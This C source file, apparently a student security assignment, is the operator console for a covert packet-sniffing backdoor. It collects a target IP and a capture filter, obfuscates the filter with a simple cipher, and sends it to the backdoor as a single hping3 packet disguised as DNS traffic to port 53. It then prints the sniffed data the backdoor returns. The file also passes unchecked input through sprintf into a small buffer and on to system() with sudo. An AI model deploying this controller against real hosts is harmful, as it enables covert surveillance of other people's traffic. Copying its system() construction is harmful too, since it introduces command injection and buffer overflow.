/*---------------------------------------------------------------------------------------------
--	SOURCE FILE:	pkt_sniffer.c -   A simple but complete packet capture
--					program that will capture and parse datagrams
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 10, 2023
--
--	REVISIONS:		(Date and nic_description)
--
--				    May 15, 2023
--				    Added personal function for assignment
--
--	DESIGNERS:		Based on the code by Martin Casado, Aman Abdulla
--					Code was also taken from tcpdump source, namely from the following files:
--					print-ether.c
--					print-ip.c
--					ip.h
--					Modified & redesigned: Aman Abdulla: 2006, 2014, 2016
--
--	Student:		HyungJoon LEE
-------------------------------------------------------------------------------------------------*/

#include "sniffer.h"
pid_t pid;

int main(int argc, char *argv[]) {
    struct options_sniffer opts;
    struct sockaddr_in sniffer_addr, target_addr;
    socklen_t target_addr_len;
    char buffer[1024] = {0};
    int option = 1;

    check_root_user();
    options_sniffer_init(&opts);
    while(1) {
        get_user_input(&opts);
        if (confirm_user_input(&opts) == 1) break;
    }
    //TODO: encrypt user input
    encrypt_and_create_instruction_file(&opts);
    send_instruction(&opts);

    if ( (opts.sniffer_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&sniffer_addr, 0, sizeof(sniffer_addr));

    sniffer_addr.sin_family    = AF_INET;
    sniffer_addr.sin_addr.s_addr = INADDR_ANY;
    sniffer_addr.sin_port = htons(DEFAULT_PORT);

    option = 1;
    setsockopt(opts.sniffer_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));

    // Bind the socket with the server address
    if ( bind(opts.sniffer_socket, (const struct sockaddr *)&sniffer_addr,
              sizeof(sniffer_addr)) < 0 ) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    target_addr_len = sizeof(target_addr);
    puts("Receiving from backdoor packet ...");
    while(1) {
        signal(SIGINT,sig_handler);
        recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, &target_addr_len);
        printf("%s\n", buffer);
        memset(buffer, 0, sizeof(buffer));
    }

    return 0;
}


void options_sniffer_init(struct options_sniffer *opts) {
    memset(opts, 0, sizeof(struct options_sniffer));
}


void get_user_input(struct options_sniffer *opts) {
    get_ip_address(opts);   /* IP address for Hping */
    get_instruction(opts);         /* Instruction [ PORT ] */
}


void get_ip_address(struct options_sniffer *opts) {
    uint8_t input_length;

    while (1) {
        puts("\n[ SNIFFING IP ]");
        printf("Enter [ IP ] to packet-sniffing backdoors: ");
        fflush(stdout);
        fgets(opts->sniff_ip, sizeof(opts->sniff_ip), stdin);
        input_length = (uint8_t) strlen(opts->sniff_ip);
        if (input_length > 0 && opts->sniff_ip[input_length - 1] == '\n') {
            opts->sniff_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->sniff_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


void get_instruction(struct options_sniffer *opts) {
    char input[64] = {0};
    uint8_t input_length = 0;

    while(1) {
        puts("\n[ SNIFFING Instruction ]");
        puts("Type [ Instruction ] to forward the backdoor instruction");
        puts("ex) tcp and dst port 443");
        fflush(stdout);

        fgets(input, sizeof(input), stdin);
        input_length = (uint8_t) strlen(input);
        input[input_length - 1] = '\0';
        if (input_length > 0) {
            strcpy(opts->sniff_instruction, input);
            break;
        }
    }
}


bool confirm_user_input(struct options_sniffer *opts) {
    bool confirm = FALSE;
    uint8_t input_length = 0;
    char c[3] = {0};

    printf("\n=============== CONFIRM ===============\n");
    printf("[      IP     ] %s\n", opts->sniff_ip);
    printf("[ Instruction ] %s\n", opts->sniff_instruction);
    printf("=======================================\n");
    printf("Is this correct? [ Y / N ]: ");
    fflush(stdout);

    fgets(c, sizeof(c), stdin);
    input_length = (uint8_t) strlen(c);
    if (input_length > 0) {
        c[input_length -1] = '\0';
        if (strcmp(c, "Y") == 0 || strcmp(c, "y") == 0) confirm = TRUE;
    }
    return confirm;
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
    FILE *output;

    if((output = fopen("instruction.txt", "wb")) == NULL) {
        printf("Cannot open the file [ %s ] for writing\n", "instruction.txt");
        exit(1);
    }

    sprintf(opts->command, "start[%s]end", opts->sniff_instruction);
    for (int i = 0; i < strlen(opts->command); i++) {
        opts->encrypt_command[i] = encrypt_decrypt(opts->command[i]);
    }

    // write to file
    fprintf(output, "%s", opts->encrypt_command);
    fclose(output);
    sleep(1);
}


void send_instruction(struct options_sniffer *opts) {
    char hping3[64] = {0};
    int pid;

    pid = fork();
    if (pid == -1) {
        puts("fork() failed");
        exit(1);
    }
    else if (pid == 0) {
        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts->sniff_ip);
        system(hping3);
    }
    else {
        wait(NULL);
    }
}


void sig_handler(int signum) {
    //Return type of the handler function should be void
    pid = getpid();
    printf("Ctrl + C pressed\n Exit program \n");
    kill(pid,SIGUSR1);
}

